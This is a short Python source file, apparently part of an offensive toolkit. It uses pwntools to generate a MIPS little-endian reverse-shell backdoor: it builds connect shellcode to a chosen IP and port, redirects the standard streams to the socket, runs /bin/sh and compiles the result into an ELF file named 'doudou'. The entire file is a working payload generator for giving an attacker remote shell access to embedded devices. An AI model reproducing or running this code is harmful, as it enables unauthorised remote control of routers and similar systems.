from pwn import pwnlib,context,log,shellcraft
from . import my_package

def mipsel_backdoor_encode(reverse_ip, reverse_port, filename=None):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	shellcode_connect = shellcraft.connect(reverse_ip,reverse_port)
	#shellcode = shellcode_connect
	shellcode = '''.section .text
.global _start
_start:
	'''
	shellcode += shellcode_connect.replace("SYS_socket",'0x1057')
	shellcode = shellcode.replace("SYS_connect",'0x104a')
	print(shellcode)
	shellcode = shellcode.replace("~AF_INET ",'-3')
	shellcode = shellcode.replace("~SOCK_STREAM",'-3')
	shellcode = shellcode.replace("SYS_execve",'0xfab')
	shellcode_dump_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_execve = shellcraft.execve("/bin/sh",["/bin/sh"],0)
	shellcode_execve = shellcode_execve.replace("SYS_execve",'0xfab')
	shellcode +=shellcode_dump_sh + shellcode_execve
	my_package.my_make_elf(my_package.context_to_arch(context.arch, context.endian), shellcode, "doudou")

	